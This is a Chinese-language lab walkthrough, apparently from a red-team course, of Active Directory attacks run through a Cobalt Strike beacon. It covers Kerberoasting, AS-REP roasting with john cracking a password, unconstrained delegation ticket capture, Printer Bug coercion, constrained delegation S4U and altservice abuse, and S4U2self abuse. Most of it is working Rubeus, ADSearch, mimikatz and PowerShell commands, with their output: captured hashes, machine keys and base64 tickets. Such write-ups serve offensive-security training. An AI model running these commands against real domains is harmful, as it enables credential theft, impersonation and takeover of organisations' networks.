# Kerberoasting

枚举域中所有SPN

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660177644996.png)


```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /simple /nowrap
[+] host called home, sent: 585311 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : dev.cyberbotic.io
[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[+] received output:

[*] Total kerberoastable users : 2


[+] received output:
$krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433@dev.cyberbotic.io*$7795F2A1A1.....FFD3844296E7D2
$krb5tgs$23$*svc_honey$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io@dev.cyberbotic.io*$20928CE9F86A3DED.....9E06CF3D88BB
```

特定用户的spn，这里选择svc_mysql

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660177751965.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:svc_mssql /nowrap
[+] host called home, sent: 585327 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: Kerberoasting


[+] received output:
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_mssql
[*] Target Domain          : dev.cyberbotic.io
[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_mssql)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[+] received output:

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
[*] PwdLastSet             : 5/14/2021 1:28:34 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433@dev.cyberbotic.io*$7795F2A1A18820C454802E5F59CAE5B9$066D8750AA3E8112A731C65CD2DE54263AF799C742F9F98BBF09B127D49ED99D858F45B1BADE67D98BF147A8B993AA467D0D1766CDD8B3AA82F71DD9B2A922B957F8F13A86705E772123B9D582E8C3CEA16FF17339D307790B50C32B74291D80D098A55C65CFDDC71747878DEEEABFDCF43523F82909E47C6B6E39039D8517BEBC7FBBC09EA39621DC2CD85A5DA7E4DE1215C92FECBF469D25E5718EEFE99D59C95BF048BB9FD72DD6A003F471CABA24EE645246F0EC55F60E3BD5A012392F77479765BB4D4DD21CDB581AED9002F82E61FD8ABCBD7426AB4C3331424642378EBDCF47ACB9FCD67235801C4AB61DCA4C033BD5AB9181C069BF1A8369894630E404474D767AABA01634B1D05F2C6AC5B7B8ECCFA43A91B445A663C0E6922E12F0A5097FD099A10244C5A0C7CE1C12391494E8D5F6333B6F6B67FE70C825019A1AB3082DD3E5DAF1FA3B1AF2EB68F227D34FB2123F1439487E6C8D13C17C552E4D441DABF9C38330786AD8325A483C2FE3F8FC2525CE47D108483C6881F2E2B94C6907429B0519671720B1189EDB9FC6E5862D72EC8DF4E3B2FE105B46D8C3D9F6A912D0E84F3632C86DD6A92B002CB66877EC4BE49A6C66507AA435CB85085A8CA87B1FFF0CF68371C0F546F5EC5D149399DF4BADB32ED6AD39361039433E01A204D4EBF292DEC2E1A0A56872CD87EFF4CB251F629420A6766D1296B9AC96E7C6BEBB8DDC9C6A25D7EA58A20929B8DCAA05E4F1B3159AF40316816062FAE89BCA1BB35E67B3193F95C234ED833A0B210370BABA8AF168F9C8639A23547D7D4D4B771DA017C3D4A55C54DE3C6F78A776040C09987C5274F70B7C6C59A6F77B3BF886130FE8EE756B110722C0B8670B51AC63F3C8CED91A3C8D746C0D6E250D1A654FBB0DAD5DDA1BD91F49C01E56D9310BE2EF393375268F5C6A5FF784933DBEEAAE5706C4271E0263CB70043CC455E6E228722713F22B1EEF00F85AD1087120A73CEEB0A56027B9CD449D789C1DDDB16922078F555EBCAA7EBBF00BFD1AE10BDA159A5A1BB5F7545A5527C8E26B9BFB958E7269358F74F54E8FE3A6812FE1E14F8D27E4696ED6ACBD435C191D038F53BB3B19469E8B10A65F0A94F636E2F126977EFFE6C1BB3E530ADB26C18EA5B01178A68D389DD356423D58EF0A341F0FC8881508EE804DAA098CB48063D0E3EA40D4F5014912E97346F3D1953480A2454FEC1B5AAA639E96A740401F76ABC4F6897BC811B161A93D338C75EEE084BC0295B5553D833C7AD261105FC54857FC397D6256020B1A22EB05749C238E9D82873B561ABBBEDAC405CBD4692B87D5763BF5228C0A6467579C5CBD61E876C08215C23DB66FAC5DED425722816AAEC29CE272C840DA1694851AF0B7F983D97E078DFE2D702CAABCE164786FC6399CF54AFD5FCE476379FE68253F746D94475647E83E222D79873C539AC8AC981C78A18AA4B4CBAB0121DF93EE0008640E96116B166F6CB6EE2CE088142275D78A91400B5DB0E32A2E529AFBE55ACAD0CD495963CDE933179D0BD1EE1B2A2D03724D799A3676366DBC3A7B943EF359AC67CE8DABC0CA86ACA600AE386D0A6D74DB1D28B7416D484EF96C67C35E61761043FC5B447BCBA543FFD3844296E7D2


```

上面格式转成
```
$krb5tgs$23$*svc_mssql$dev.cyberbotic.io*$7795F2A1A18820C454802E5F59CAE5B9$066D8750AA3E8112A731C65CD2DE54263AF799C742F9F98BBF09B127D49ED99D858F45B1BADE67D98BF147A8B993AA467D0D1766CDD8B3AA82F71DD9B2A922B957F8F13A86705E772123B9D582E8C3CEA16FF17339D307790B50C32B74291D80D098A55C65CFDDC71747878DEEEABFDCF43523F82909E47C6B6E39039D8517BEBC7FBBC09EA39621DC2CD85A5DA7E4DE1215C92FECBF469D25E5718EEFE99D59C95BF048BB9FD72DD6A003F471CABA24EE645246F0EC55F60E3BD5A012392F77479765BB4D4DD21CDB581AED9002F82E61FD8ABCBD7426AB4C3331424642378EBDCF47ACB9FCD67235801C4AB61DCA4C033BD5AB9181C069BF1A8369894630E404474D767AABA01634B1D05F2C6AC5B7B8ECCFA43A91B445A663C0E6922E12F0A5097FD099A10244C5A0C7CE1C12391494E8D5F6333B6F6B67FE70C825019A1AB3082DD3E5DAF1FA3B1AF2EB68F227D34FB2123F1439487E6C8D13C17C552E4D441DABF9C38330786AD8325A483C2FE3F8FC2525CE47D108483C6881F2E2B94C6907429B0519671720B1189EDB9FC6E5862D72EC8DF4E3B2FE105B46D8C3D9F6A912D0E84F3632C86DD6A92B002CB66877EC4BE49A6C66507AA435CB85085A8CA87B1FFF0CF68371C0F546F5EC5D149399DF4BADB32ED6AD39361039433E01A204D4EBF292DEC2E1A0A56872CD87EFF4CB251F629420A6766D1296B9AC96E7C6BEBB8DDC9C6A25D7EA58A20929B8DCAA05E4F1B3159AF40316816062FAE89BCA1BB35E67B3193F95C234ED833A0B210370BABA8AF168F9C8639A23547D7D4D4B771DA017C3D4A55C54DE3C6F78A776040C09987C5274F70B7C6C59A6F77B3BF886130FE8EE756B110722C0B8670B51AC63F3C8CED91A3C8D746C0D6E250D1A654FBB0DAD5DDA1BD91F49C01E56D9310BE2EF393375268F5C6A5FF784933DBEEAAE5706C4271E0263CB70043CC455E6E228722713F22B1EEF00F85AD1087120A73CEEB0A56027B9CD449D789C1DDDB16922078F555EBCAA7EBBF00BFD1AE10BDA159A5A1BB5F7545A5527C8E26B9BFB958E7269358F74F54E8FE3A6812FE1E14F8D27E4696ED6ACBD435C191D038F53BB3B19469E8B10A65F0A94F636E2F126977EFFE6C1BB3E530ADB26C18EA5B01178A68D389DD356423D58EF0A341F0FC8881508EE804DAA098CB48063D0E3EA40D4F5014912E97346F3D1953480A2454FEC1B5AAA639E96A740401F76ABC4F6897BC811B161A93D338C75EEE084BC0295B5553D833C7AD261105FC54857FC397D6256020B1A22EB05749C238E9D82873B561ABBBEDAC405CBD4692B87D5763BF5228C0A6467579C5CBD61E876C08215C23DB66FAC5DED425722816AAEC29CE272C840DA1694851AF0B7F983D97E078DFE2D702CAABCE164786FC6399CF54AFD5FCE476379FE68253F746D94475647E83E222D79873C539AC8AC981C78A18AA4B4CBAB0121DF93EE0008640E96116B166F6CB6EE2CE088142275D78A91400B5DB0E32A2E529AFBE55ACAD0CD495963CDE933179D0BD1EE1B2A2D03724D799A3676366DBC3A7B943EF359AC67CE8DABC0CA86ACA600AE386D0A6D74DB1D28B7416D484EF96C67C35E61761043FC5B447BCBA543FFD3844296E7D2
```



# AS-REP Roasting

枚举关闭了kerberos预认证的用户

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178346391.jpg)

枚举上面用户的哈希

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178409310.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asreproast /user:svc_oracle /nowrap
[+] host called home, sent: 585329 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: AS-REP roasting

[*] Target User            : svc_oracle
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=svc_oracle))'
[*] SamAccountName         : svc_oracle
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\svc_oracle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$svc_oracle@dev.cyberbotic.io:5125359739A99E22EC26ADD5B60287CE$1ECD74195BC35CAC5224A3BD84879CED340BBF22E7309F02E7DC9EA7BCFC4FDD4419E511BFAFB3FC8FC397605B0CA193CB0D235FE3407A99D4E5DB2ECD08CA7A51CB63EFAAC700776A1B89BEF6A2DFAD6E6CC1A83C4C3EF8BB87EC5CB26BDE1C1792D0F96BCE8BF18258386379B8C475995255F32384FEC81B09C75F09F2504B7C04D8C5FF28DFEEC28D397BF15B9A6D91348012B37918CBCC20CC4B04C273D4F0D63BC21CF6ACDC4AD24C40B016325A760BDF1483614567F5EED768B745B1C9145A87CEDF374F8B38B6D704F61B84990BB0A51F1CF4EF6F8AFE652760A1FB943247710B6B740A8132920EAA42A94828F86434A3BBFB


```

整理成一行
```
$krb5asrep$svc_oracle@dev.cyberbotic.io:5125359739A99E22EC26ADD5B60287CE$1ECD74195BC35CAC5224A3BD84879CED340BBF22E7309F02E7DC9EA7BCFC4FDD4419E511BFAFB3FC8FC397605B0CA193CB0D235FE3407A99D4E5DB2ECD08CA7A51CB63EFAAC700776A1B89BEF6A2DFAD6E6CC1A83C4C3EF8BB87EC5CB26BDE1C1792D0F96BCE8BF18258386379B8C475995255F32384FEC81B09C75F09F2504B7C04D8C5FF28DFEEC28D397BF15B9A6D91348012B37918CBCC20CC4B04C273D4F0D63BC21CF6ACDC4AD24C40B016325A760BDF1483614567F5EED768B745B1C9145A87CEDF374F8B38B6D704F61B84990BB0A51F1CF4EF6F8AFE652760A1FB943247710B6B740A8132920EAA42A94828F86434A3BBFB
```

用john破解
```
┌──(root💀kali)-[~/crto]
└─# john  svc_oracle --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd!        ($krb5asrep$svc_oracle@dev.cyberbotic.io)     
1g 0:00:00:00 DONE (2022-08-11 00:00) 2.127g/s 598059p/s 598059c/s 598059C/s SANANDREAS..March30
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```


# 无约束委派

枚举无约束委派的机器

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178578300.png)


DC默认是无约束委派的机器，重点关注SRV-1$

1. 假设已经攻破SRV-1$这台机器，在SRV-1$上开启监听：

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179325582.png)


2. 来到WKSTN-2，以nlamb的身份执行```dir \\srv-1\c$```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179399723.png)

3. 收到nlamb的票据哈希


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179478426.png)


```
[+] received output:

[*] 8/13/2022 12:05:37 AM UTC - Found new TGT:

  User                  :  nlamb@DEV.CYBERBOTIC.IO
  StartTime             :  8/13/2022 12:05:35 AM
  EndTime               :  8/13/2022 10:05:35 AM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsG
    a3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP46cUuZcjwVYCnrsfz/+ND3pPTeURup/ID
    /eK56bLSGFYat3pt8llgbkjI+JTE5bG2EPi+1+vhNZSluxWKsdmehHvvyecOLwCpiLAtS7jj0wntk/SMgOjhgps6fNmbxAdtnjo9
    WxWHSIYONIblOrEqzLky9dFVFO9zlxlKZt+paK9YElEtb+Gtb+coplTWxV0fM9Uh8REFDQlKpPv7kdYEA+BhyTnsDq2a92VgJ2BH
    Snq+Nqu5iUBuVrRva25P5mcEbOqZhc44+GnHigkgk9VulSi4JV5tYgUapj5nmYv2cJyYqxY6PoL/2JOMozK+qNXIpClB2w7JaJts
    qnshN7kcRm3pGq5UVu2BLSvM0OywYzw4neU55j5jK8dtfRGb44gTEWmdlktD7NpWcEzrCHHBDl7yUSWp9eUgzlUjHzAIAlLN16FV
    tdHJs81KOCt8cGIWvG4GzjQiZ8Bw/hMqPxDd+ccdeIuPooydEyJNZ6A8afmuHObDif/c/mHZ9zaQOpH8y2w56wRsIWHB+71B96wR
    dH3w/2SttBd3if8YdhDIV+a2JeJwu58lkdxrPllRD5fCx8nssaFD1+f160Iui7RN8sDK3bfL4IucOzZHkvC024NNNu139K7ShexL
    felaQO6n8NT2y/vtjQEFpjdvXXypo+Q5R3cb5xA+PIu5VFtU5AWe2ZQrde7TYwhDlV+e5e4wqIL7s+HFZFBrOWh+NHFLqPmwbx/8
    TQytnZAhcPZLp6HdhNh5plP+o9HZapOXd6x5jexQI7BxqGo0m/lU0vuAHqoKcyJHV4MGPUTuY3Byw+37yYnLaR4W6jvvzRl+jMie
    lLE3I852D3SFXOGuAJRdf+ZhrrVrY6Eeb8bKfImsLp9CvbxGEsAvs9K5kcWIWJ3sPC880o7DZlVJP6jIkOSVIWrnKUaxB+7PvVbc
    GoNkVsi23MHCUPPArF3Im9jxWagODSQHmhzYiKkghHJIHZUX4KymnmnEjebClwcQvtol570LS/cvGqtEStvCQLH30kXI+bXtiBPx
    ZUTYRnztDyMwBTUqhSELZbrvGA/SViJrOMZO24vUc7VpMwArVRDlubq1VBNuZNpSCuHXoQ9Dz0X65lCETjpyKSxGPh4cPiwY/xDl
    jqEZnG6COOSj6iSHAR1w8eDw1ziMUYGIf0uNHsJBhHRiZYaL8FbL/0rPvVKWPSuJk69smoSMn22bLNf05aP15RbyGiC3nymUCHRX
    hT3b+APKxsFHl8h/DbVlEvPWFmI6hGIO7I3/4VJkXUkI+0VebmRk9BfVF/T+U1lHr9iy0DGjocsAzOhL23Y8JCV839tNmM6DFTY5
    jGu5lOOwl5J/fiE4yFGcp7CjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCDp028cyVAizDtOxteL
    I/smZyuj14wvAn5HtIjziiQwh6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIw
    MjIwODEzMDAwNTM1WqYRGA8yMDIyMDgxMzEwMDUzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYw
    JKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw==

[*] Ticket cache size: 1




```


用powershell根据tgt制作ticket
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nlamb.kirbi", [Convert]::FromBase64String("doIFZzCCBW....uQ1lCRVJCT1RJQy5JTw=="))
```



4. 停止捕获

```
beacon> jobs
[*] Tasked beacon to list jobs
[+] host called home, sent: 8 bytes
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    4400  .NET assembly

beacon> jobkill 1
[*] Tasked beacon to kill job 1
[+] host called home, sent: 10 bytes
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179755965.png)

5. 转存ticket


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349494829.png)

6. 使用上面生成的ticket


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349572197.png)


# The "Printer Bug"

也是无约束委派的利用

1. 在srv-1开启监听
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349812805.png)

2. 在WKSTN-1强制dc-2向srv-1进行身份验证

```
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349927216.png)

3. 捕获到DC2的ticket


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660349990632.png)

4. 制作成dc2的ticket


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660350175707.png)

5. 导入ticket


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660350337962.png)

# Constrained Delegation

枚举约束委派
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

显示
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
[*] Tasked beacon to run .NET program: ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
[+] host called home, sent: 483667 bytes
[+] received output:

    ___    ____  _____                 __  
   /   |  / __ \/ ___/___  ____ ______/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 

[+] received output:
[*] TOTAL NUMBER OF SEARCH RESULTS: 1

[+] received output:
[
  {
    "cn": "SRV-2",
    "dnshostname": "srv-2.dev.cyberbotic.io",
    "samaccountname": "SRV-2$",
    "msds-allowedtodelegateto": [
      "eventlog/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "eventlog/dc-2.dev.cyberbotic.io",
      "eventlog/DC-2",
      "eventlog/dc-2.dev.cyberbotic.io/DEV",
      "eventlog/DC-2/DEV",
      "cifs/wkstn-2.dev.cyberbotic.io",
      "cifs/WKSTN-2"
    ]
  }
]

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660350554524.png)

从枚举结果可知，srv-2委派了

wkstn-2上的cifs服务

dc-2上的eventlog服务

## 方法一
查看机器里面的tgt
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
```

显示
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
[*] Tasked beacon to run .NET program: Rubeus.exe triage
[+] host called home, sent: 585271 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ---------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                   | Service                                       | EndTime               |
 ---------------------------------------------------------------------------------------------------------------- 
 | 0x3e4   | srv-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 8/13/2022 9:59:32 AM  |

...

```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660351272613.png)


## 方法二

或者使用mimimkatz导出srv-2的tgt

导出哈希
```
mimikatz sekurlsa::ekeys
beacon> mimikatz sekurlsa::ekeys
[*] Tasked beacon to run mimikatz's sekurlsa::ekeys command
[+] host called home, sent: 788093 bytes
[+] received output:

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SRV-2$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 8/12/2022 11:56:25 PM
SID               : S-1-5-20

	 * Username : srv-2$
	 * Domain   : DEV.CYBERBOTIC.IO
	 * Password : (null)
	 * Key List :
	   aes256_hmac       6e2aa9430552f43c26e3d534d49776f7a53ca938dff193b877ba7502bdaf1750
	   rc4_hmac_nt       f797a8372d1e7a821e49f61efca73e23
	   rc4_hmac_old      f797a8372d1e7a821e49f61efca73e23
	   rc4_md4           f797a8372d1e7a821e49f61efca73e23
	   rc4_hmac_nt_exp   f797a8372d1e7a821e49f61efca73e23
	   rc4_hmac_old_exp  f797a8372d1e7a821e49f61efca73e23


```

利用哈希导出tgt
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:srv-2$ /aes256:6e2aa9430552f43c26e3d534d49776f7a53ca938dff193b877ba7502bdaf1750 /opsec /nowrap
```


根据base64制作tgt（这一步非必须，下面直接用了bases64做ticket）

```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\srv-2.kirbi", [Convert]::FromBase64String("doIFLDCCBSig...SU8="))
```


根据tgt，生成访问cifs的tgs

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSig...SU8= /nowrap
```

结果

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSig...SU8= /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /ticket:doIFLDCCBSig...SU8= /nowrap
[+] host called home, sent: 588995 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: S4U


[+] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2self request to 10.10.17.71:88

[+] received output:
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'SRV-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFfjCCB............TIk

[*] Impersonating user 'nlamb' to target SPN 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2proxy request to domain controller 10.10.17.71:88

[+] received output:
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/wkstn-2.dev.cyberbotic.io':

      doIGWDCC.....Ym90aWMuaW8=


```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660352025272.png)


根据生成的tgs写票据

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\cifs.kirbi" , [System.Convert]::FromBase64String( "doIGWDC....aWMuaW8="))
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660352469858.png)

导入票据


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660352448322.png)

# Alternate Service Name

altservice利用原理是tgs中的服务名不受保护，可修改

申请tgs，这里本来只是委托了eventlog服务，但是我们可以修改成cifs
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /ticket:doIFLDCC.....uSU8= /nowrap
```

根据上面生成的base64写tgs票据

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc2-cifs.kirbi" , [System.Convert]::FromBase64String( "doIGUjCCBk6gAwIBBaEDAgE....MuaW8="))
```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660354070932.png)


导入dc2-cifs.kirbi，访问dc2的文件系统
```
make_token DEV\nlamb FakePass

kerberos_ticket_use C:\Users\Administrator\Desktop\dc2-cifs.kirbi
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660353939907.png)

# S4U2self Abuse


这个实验主要是通过修改TGS文件里不受保护的服务名（从WKSTN-2$修改为cifs/wkstn-2.dev.cyberbotic.io）来达到访问主机的目的。前提是要知道wkstn-2的哈希或者tgt


## 利用printerbug拿到wkstn-2的tgt

1. 在srv-1开启监听
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser: WKSTN-2$ /interval:10 /nowrap
```


2. 在WKSTN-1强制WKSTN-2向srv-1进行身份验证

```
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe WKSTN-2 srv-1
```



3. 捕获到WKSTN-2的ticket

收到
```
[+] received output:

[*] 8/14/2022 8:03:21 AM UTC - Found new TGT:

  User                  :  WKSTN-2$@DEV.CYBERBOTIC.IO
  StartTime             :  8/14/2022 8:03:21 AM
  EndTime               :  8/14/2022 6:03:21 PM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

